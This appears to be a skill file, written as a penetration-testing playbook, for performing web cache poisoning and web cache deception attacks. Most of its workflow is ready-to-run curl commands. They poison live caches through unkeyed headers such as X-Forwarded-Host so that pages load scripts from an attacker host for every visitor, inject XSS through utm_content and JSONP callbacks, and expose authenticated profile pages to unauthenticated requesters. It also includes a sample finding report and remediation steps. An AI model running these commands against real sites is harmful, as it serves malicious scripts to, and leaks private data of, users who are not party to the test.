---
name: performing-web-cache-poisoning-attack
description: Exploiting web cache mechanisms to serve malicious content to other users by poisoning cached responses through unkeyed headers and parameters during authorized security tests.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, cache-poisoning, web-security, cdn, burpsuite, owasp]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Web Cache Poisoning Attack

## When to Use

- During authorized penetration tests when the application uses CDN or reverse proxy caching (Cloudflare, Akamai, Varnish, Nginx)
- When assessing web applications for cache-based vulnerabilities that could affect all users
- For testing whether unkeyed HTTP headers are reflected in cached responses
- When evaluating cache key behavior and cache deception vulnerabilities
- During security assessments of applications with aggressive caching policies

## Prerequisites

- **Authorization**: Written penetration testing agreement explicitly covering cache poisoning testing
- **Burp Suite Professional**: With Param Miner extension for automated unkeyed header discovery
- **curl**: For manual cache testing with precise header control
- **Target knowledge**: Understanding of the caching layer (CDN provider, cache headers)
- **Cache buster**: Unique query parameter to isolate test requests from other users
- **Caution**: Cache poisoning affects all users; test with cache-busting parameters first

## Workflow

### Step 1: Identify the Caching Layer and Behavior

Determine what caching infrastructure is in use and how the cache key is constructed.

```bash
# Check cache-related response headers
curl -s -I "https://target.example.com/" | grep -iE \
  "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"

# Common cache indicators:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS / DYNAMIC (Cloudflare)
# Age: 120 (seconds since cached)
# X-Varnish: 12345 67890 (Varnish)
# Via: 1.1 varnish (Varnish/CDN proxy)

# Determine cache key by testing variations
# Cache key typically includes: Host + Path + Query string

# Test 1: Same URL, two requests - check if second is cached
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
# First: MISS, Second: HIT = caching is active

# Test 2: Vary header behavior
curl -s -I "https://target.example.com/" | grep -i "vary"
# Vary: Accept-Encoding means Accept-Encoding is part of cache key
```

### Step 2: Discover Unkeyed Inputs with Param Miner

Use Burp's Param Miner to find headers and parameters not included in the cache key but reflected in responses.

```
# In Burp Suite:
# 1. Install Param Miner from BApp Store
# 2. Right-click target request > Extensions > Param Miner > Guess headers
# 3. Param Miner will test hundreds of HTTP headers
# 4. Check results in Extender > Extensions > Param Miner > Output

# Common unkeyed headers to test manually:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto
# X-Original-URL, X-Rewrite-URL
# X-Host, X-Forwarded-Server
# Origin, Referer
# X-Forwarded-For, True-Client-IP
```

```bash
# Manual testing for unkeyed header reflection
# Add cache buster to isolate testing
CB="cachebuster=$(date +%s)"

# Test X-Forwarded-Host reflection
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?$CB" | grep "evil.example.com"

# Test X-Forwarded-Scheme
curl -s -H "X-Forwarded-Scheme: nothttps" \
  "https://target.example.com/?$CB" | grep "nothttps"

# Test X-Original-URL (path override)
curl -s -H "X-Original-URL: /admin" \
  "https://target.example.com/?$CB"

# Test X-Forwarded-Proto
curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?$CB" | grep "http://"
```

### Step 3: Exploit Unkeyed Header for Cache Poisoning

Craft requests that poison cached responses with malicious content.

```bash
# Scenario: X-Forwarded-Host reflected in resource URLs
# Normal response includes: <script src="https://target.example.com/app.js">
# Poisoned: <script src="https://evil.example.com/app.js">

# Step 1: Confirm reflection with cache buster
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?cb=unique123" | \
  grep "evil.example.com"

# Step 2: Poison the actual cached page (WITHOUT cache buster)
# WARNING: This affects all users - only do with explicit authorization
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/"

# Step 3: Verify cache is poisoned
curl -s "https://target.example.com/" | grep "evil.example.com"
# If evil.example.com appears, the cache is poisoned

# Attack with X-Forwarded-Proto for HTTP downgrade
curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?cb=unique456"
# May cause cached response to include http:// links, enabling MitM

# Attack with multiple headers
curl -s \
  -H "X-Forwarded-Host: evil.example.com" \
  -H "X-Forwarded-Proto: https" \
  "https://target.example.com/?cb=unique789"
```

### Step 4: Test Web Cache Deception

Trick the cache into storing authenticated responses for public URLs.

```bash
# Web Cache Deception attack
# The cache caches based on file extension (.css, .js, .jpg)
# If the application ignores path suffixes:

# Step 1: As victim (authenticated), visit:
# https://target.example.com/account/profile/nonexistent.css
# If the application returns the profile page (ignoring .css suffix)
# AND the cache stores it because of .css extension...

# Test application path handling
curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
  "https://target.example.com/account/profile/test.css" | \
  grep -i "email\|name\|balance"

# Step 2: As attacker (unauthenticated), request:
curl -s "https://target.example.com/account/profile/test.css"
# If victim's profile data is returned, cache deception is confirmed

# Test various static extensions
for ext in css js jpg png gif ico svg woff woff2 ttf; do
  echo -n ".$ext: "
  curl -s -H "Authorization: Bearer $TOKEN" \
    -o /dev/null -w "%{http_code} %{size_download}" \
    "https://target.example.com/account/settings/x.$ext"
  echo
done

# Test path confusion patterns
# /account/settings%2f..%2fstatic/style.css
# /account/settings/..;/static/style.css
# /account/settings;.css
```

### Step 5: Test Parameter-Based Cache Poisoning

Exploit unkeyed query parameters or parameter parsing differences.

```bash
# Unkeyed parameter (parameter not in cache key but reflected)
# Using UTM parameters that are often excluded from cache keys
curl -s "https://target.example.com/?utm_content=<script>alert(1)</script>&cb=$(date +%s)" | \
  grep "alert"

# Parameter cloaking via parsing differences
# Backend sees: callback=evil, Cache key ignores: callback
curl -s "https://target.example.com/jsonp?callback=alert(1)&cb=$(date +%s)"

# Fat GET request (body in GET request)
curl -s -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=evil_value" \
  "https://target.example.com/page?cb=$(date +%s)"

# Cache key normalization differences
# Some caches normalize query string order, some don't
curl -s "https://target.example.com/page?a=1&b=2" # Cached as key1
curl -s "https://target.example.com/page?b=2&a=1" # Same key? Or different?

# Test port-based cache poisoning
curl -s -H "Host: target.example.com:1234" \
  "https://target.example.com/?cb=$(date +%s)" | grep "1234"
```

### Step 6: Validate Impact and Clean Up

Confirm the attack impact and ensure poisoned cache entries are cleared.

```bash
# Verify poisoned cache serves to other users
# Use a different IP/User-Agent/session to verify
curl -s -H "User-Agent: CacheVerification" \
  "https://target.example.com/" | grep "evil"

# Check cache TTL to understand exposure window
curl -s -I "https://target.example.com/" | grep -i "cache-control\|max-age\|s-maxage"
# max-age=3600 means poisoned for 1 hour

# Clean up: Force cache refresh
# Some CDNs allow purging via API
# Cloudflare: API call to purge cache
# Varnish: PURGE method
curl -s -X PURGE "https://target.example.com/"
# Or wait for TTL to expire

# Document the cache poisoning window
# Start time: when poison request was sent
# End time: start time + max-age
# Affected users: all users hitting the cached URL during the window
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Cache Key** | The set of request attributes (host, path, query) used to identify cached responses |
| **Unkeyed Input** | HTTP headers or parameters not included in the cache key but reflected in responses |
| **Cache Poisoning** | Injecting malicious content into cached responses that are served to other users |
| **Cache Deception** | Tricking the cache into storing authenticated/private responses as public content |
| **Vary Header** | HTTP header specifying which request headers should be included in the cache key |
| **Cache Buster** | A unique query parameter used to prevent affecting the real cache during testing |
| **TTL (Time to Live)** | Duration a cached response remains valid before being refreshed |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and cache behavior analysis |
| **Param Miner (Burp Extension)** | Automated discovery of unkeyed HTTP headers and parameters |
| **Web Cache Vulnerability Scanner** | Automated cache poisoning detection tool |
| **curl** | Manual HTTP request crafting with precise header control |
| **Varnishlog** | Varnish cache debugging and log analysis |
| **CDN-specific tools** | Cloudflare Analytics, Akamai Pragma headers for cache diagnostics |

## Common Scenarios

### Scenario 1: X-Forwarded-Host Script Injection
The application reflects the `X-Forwarded-Host` header in script src URLs. This header is not part of the cache key. Sending a request with `X-Forwarded-Host: evil.com` poisons the cache to load JavaScript from the attacker's server for all subsequent visitors.

### Scenario 2: Web Cache Deception on Account Page
A Cloudflare-cached application ignores unknown path segments. Requesting `/account/profile/logo.png` returns the account page while Cloudflare caches it as a static image. Any unauthenticated user can then access the cached account page.

### Scenario 3: Parameter-Based XSS via Cache
UTM tracking parameters are excluded from the cache key but rendered in the page HTML. Injecting `<script>` tags via `utm_content` parameter poisons the cache with stored XSS affecting all visitors.

### Scenario 4: CDN Cache Poisoning via Host Header
Multiple applications are behind the same CDN. Manipulating the Host header causes the CDN to cache a response from one application under another application's cache key.

## Output Format

```
## Web Cache Poisoning Finding

**Vulnerability**: Web Cache Poisoning via Unkeyed Header
**Severity**: High (CVSS 8.6)
**Location**: X-Forwarded-Host header on all pages
**OWASP Category**: A05:2021 - Security Misconfiguration

### Cache Configuration
| Property | Value |
|----------|-------|
| CDN/Cache | Cloudflare |
| Cache-Control | max-age=3600, public |
| Unkeyed Headers | X-Forwarded-Host, X-Forwarded-Proto |
| Affected Pages | All HTML pages (/*.html) |

### Reproduction Steps
1. Send request with X-Forwarded-Host: evil.example.com
2. Response includes: <link href="https://evil.example.com/style.css">
3. This response is cached by Cloudflare for 3600 seconds
4. All subsequent visitors receive the poisoned response

### Impact
- JavaScript execution in all users' browsers (via poisoned script src)
- Credential theft, session hijacking, defacement
- Affects estimated 50,000 daily visitors during 1-hour cache window
- Can be re-poisoned continuously for persistent attack

### Recommendation
1. Include X-Forwarded-Host and similar headers in the cache key via Vary header
2. Do not reflect unkeyed headers in response content
3. Configure the cache to strip unknown headers before forwarding to origin
4. Use application-level hardcoded base URLs instead of deriving from headers
5. Implement cache key normalization to prevent key manipulation
```
